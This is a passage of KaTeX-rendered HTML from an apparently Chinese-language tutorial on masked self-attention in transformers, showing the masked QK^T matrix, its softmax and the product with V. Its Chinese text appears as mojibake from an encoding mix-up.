style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>M</mi><mi>a</mi><mi>s</mi><mi>k</mi><mi>e</mi><mi>d</mi><mo stretchy="false">(</mo><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>00</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>âˆ’</mo><mi mathvariant="normal">âˆ</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>âˆ’</mo><mi mathvariant="normal">âˆ</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>10</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>âˆ’</mo><mi mathvariant="normal">âˆ</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>20</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>22</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">Masked(QK^T) =\begin{bmatrix}y_{00} &amp; -\infty &amp; -\infty \\y_{10} &amp; y_{11} &amp; -\infty \\y_{20} &amp; y_{21} &amp; y_{22}\end{bmatrix}  </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">00</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">20</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">âˆ’</span><span class="mord">âˆ</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">âˆ’</span><span class="mord">âˆ</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">âˆ’</span><span class="mord">âˆ</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mo>=</mo><mi>S</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>M</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>M</mi><mi>a</mi><mi>s</mi><mi>k</mi><mi>e</mi><mi>d</mi><mo stretchy="false">(</mo><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mn>00</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mn>10</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mn>20</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mn>22</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>p</mi><mn>0</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mn>2</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">P=SoftMax(Masked(QK^T)) =\begin{bmatrix}p_{00} &amp; 0&amp;0 \\p_{10} &amp; p_{11} &amp; 0\\p_{20} &amp; p_{21} &amp; p_{22}\end{bmatrix}=\begin{bmatrix}p_0 \\ p1 \\ p2\end{bmatrix}  </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.10903em;">tM</span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">00</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">20</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="mord">1</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">p</span><span class="mord">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<p>å°†Våˆ†å—å†™ä¸ºV=[v_0, v_1]</p>
<p>æœ€ç»ˆç»“æœï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mo>=</mo><mi>P</mi><mi>V</mi><mo>=</mo><mi>S</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>M</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>M</mi><mi>a</mi><mi>s</mi><mi>k</mi><mi>e</mi><mi>d</mi><mo stretchy="false">(</mo><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mi>V</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>p</mi><mn>0</mn></msub><msub><mi>v</mi><mn>0</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>p</mi><mn>0</mn></msub><msub><mi>v</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>p</mi><mn>1</mn></msub><msub><mi>v</mi><mn>0</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>p</mi><mn>1</mn></msub><msub><mi>v</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>p</mi><mn>2</mn></msub><msub><mi>v</mi><mn>0</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>p</mi><mn>2</mn></msub><msub><mi>v</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">A=PV=SoftMax(Masked(QK^T))V= \begin{bmatrix} p_0v_0 &amp; p_0v_1 \\ p_1v_0 &amp; p_1v_1 \\ p_2v_0 &amp; p_2v_1 \end{bmatrix}  </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.10903em;">tM</span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mclose">))</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord 